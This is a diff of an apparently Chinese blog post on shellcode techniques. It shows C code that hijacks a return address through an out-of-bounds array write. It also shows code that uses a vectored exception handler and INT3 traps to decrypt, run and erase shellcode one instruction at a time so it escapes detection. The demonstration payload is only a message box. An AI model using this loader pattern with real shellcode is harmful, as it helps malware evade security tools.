+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">//完成恶意代码的释放、解密、执行</span></span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打了"</span>, <span class="string">"我错了"</span>, MB_OK);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">2022</span>;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line">	<span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">	arr[<span class="number">5</span>] = (<span class="keyword">int</span>)Decshellcode;</span><br><span class="line">	<span class="comment">//return 0;</span></span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649559630756.png"></p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为什么会执行呢，我们知道调用函数在汇编中要有call，但是我们并没有发现call指令</p>
@@ -524,53 +374,7 @@ int main()
 <h1 id="0x07-shellcode的加密与释放"><a href="#0x07-shellcode的加密与释放" class="headerlink" title="0x07-shellcode的加密与释放"></a>0x07-shellcode的加密与释放</h1><p>即使我们对shellcode代码进行了加密，但是我们的shellcode一定会被解密并释放出来，这时候就难以绕过检测，所以我们要将我们的shellcode执行完就被擦除掉，让其不留痕迹。</p>
 <p>这时候就需要异常处理机制（VEH）和栈溢出同时利用，对逐条恶意代码指令进行解密，然后调用，注意再每条指令最后加上CC，然后解密完代码后再重新指向llcode，让其触发异常。</p>
 <p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649571545227.png"></p>
-<pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;
-#include&lt;stdio.h&gt;
-#pragma data_seg("ldata")
-
-char trapcode[] = "*";
-unsigned long long llcode = 204;//CC 00 00 00INT3
-#pragma data_seg()
-#pragma comment(linker,"/SECTION:ldata,RWE")
-void Decshellcode()
-{
-
-	llcode = 0xF333333333333333;
-	llcode &lt;&lt;= 2;
-	char* data = (char*)&amp;llcode;
-	/*
-	* 解密shellcode 并且执行
-	* len 解密后的指令长度
-	* data 把解密后的指令写入data
-	* 比如 push ebp 就向data写入0x55
-	* 每次解密一条指令 不要用超过7字节的指令和跳转指令
-	*/
-	MessageBoxA(0, "不要再打辣", "停下", MB_OK);
-	return ;
-}
-long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val)
-{
-	if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)
-	{
-		Decshellcode();
-		val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;
-		return EXCEPTION_CONTINUE_EXECUTION;
-	}
-	else
-		return EXCEPTION_CONTINUE_SEARCH;
-}
-
-#pragma optimize("",off)
-int main()
-{
-	AddVectoredExceptionHandler(1, ExceptionHandle);
-	int bilibili = 2020;
-	int arr[2] = { 1,2 };
-	int ti = 23;
-	arr[5] = (int)&amp;llcode;
-	return 0;
-}
-#pragma optimize("",on)</code></pre>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"ldata"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> trapcode[] = <span class="string">"*"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> llcode = <span class="number">204</span>;<span class="comment">//CC 00 00 00INT3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/SECTION:ldata,RWE"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decshellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"></span><br><span class="line">	llcode = <span class="number">0xF333333333333333</span>;</span><br><span class="line">	llcode &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">char</span>* data = (<span class="keyword">char</span>*)&amp;llcode;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	* 解密shellcode 并且执行</span></span><br><span class="line"><span class="comment">	* len 解密后的指令长度</span></span><br><span class="line"><span class="comment">	* data 把解密后的指令写入data</span></span><br><span class="line"><span class="comment">	* 比如 push ebp 就向data写入0x55</span></span><br><span class="line"><span class="comment">	* 每次解密一条指令 不要用超过7字节的指令和跳转指令</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">"不要再打辣"</span>, <span class="string">"停下"</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">long</span> _stdcall <span class="title">ExceptionHandle</span><span class="params">(PEXCEPTION_POINTERS val)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="keyword">if</span> (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT)</span><br><span class="line">	{</span><br><span class="line">		Decshellcode();</span><br><span class="line">		val-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,off)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	AddVectoredExceptionHandler(<span class="number">1</span>, ExceptionHandle);</span><br><span class="line">	<span class="keyword">int</span> bilibili = <span class="number">2020</span>;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">2</span>] = { <span class="number">1</span>,<span class="number">2</span> };</span><br><span class="line">	<span class="keyword">int</span> ti = <span class="number">23</span>;</span><br><span class="line">	arr[<span class="number">5</span>] = (<span class="keyword">int</span>)&amp;llcode;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">""</span>,on)</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html">https://www.cnblogs.com/hdtianfu/archive/2011/12/27/2303113.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-190668.htm">https://bbs.pediy.com/thread-190668.htm</a></p>
@@ -656,13 +460,13 @@ int main()
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">278k</span>
+    <span title="站点总字数">273k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:13</span>
+    <span title="站点阅读时长">4:08</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
